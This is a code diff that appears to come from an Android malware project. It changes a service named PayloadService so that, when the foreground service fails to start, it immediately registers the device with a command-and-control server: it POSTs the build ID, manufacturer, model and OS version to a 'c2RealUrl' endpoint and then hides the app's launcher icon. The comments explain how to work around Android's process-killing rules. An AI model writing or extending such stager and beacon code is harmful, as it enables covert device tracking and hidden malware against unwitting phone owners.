@@ -50,9 +50,36 @@ class PayloadService : Service() {
             val notification = buildNotification()
             startForeground(NOTIFICATION_ID, notification)
         } catch (e: Exception) {
-            Log.e(TAG, "startForeground failed, falling back to HTTP-only mode", e)
-            registerViaHTTP()
-            return START_STICKY
+            Log.e(TAG, "startForeground failed, synchronous HTTP before stopSelf", e)
+            // Must register SYNCHRONOUSLY before stopping — if we return without
+            // startForeground(), the system kills the process (and background threads)
+            // via ForegroundServiceDidNotStartInTimeException within seconds
+            try {
+                val url = java.net.URL("${StagerApplication.c2RealUrl}/api/register")
+                val conn = url.openConnection() as java.net.HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.connectTimeout = 5000
+                conn.readTimeout = 5000
+                conn.doOutput = true
+                conn.setRequestProperty("Content-Type", "application/json")
+                val info = JSONObject().apply {
+                    put("device_id", Build.ID)
+                    put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
+                    put("manufacturer", Build.MANUFACTURER)
+                    put("model", Build.MODEL)
+                    put("android_version", Build.VERSION.RELEASE)
+                    put("api_level", Build.VERSION.SDK_INT)
+                }
+                conn.outputStream.write(info.toString().toByteArray())
+                val code = conn.responseCode
+                conn.disconnect()
+                Log.i(TAG, "HTTP registration: $code")
+                if (code == 200) hideLauncherIcon()
+            } catch (e2: Exception) {
+                Log.e(TAG, "Synchronous HTTP registration failed", e2)
+            }
+            stopSelf()
+            return START_NOT_STICKY
         }
 
         isRunning = true
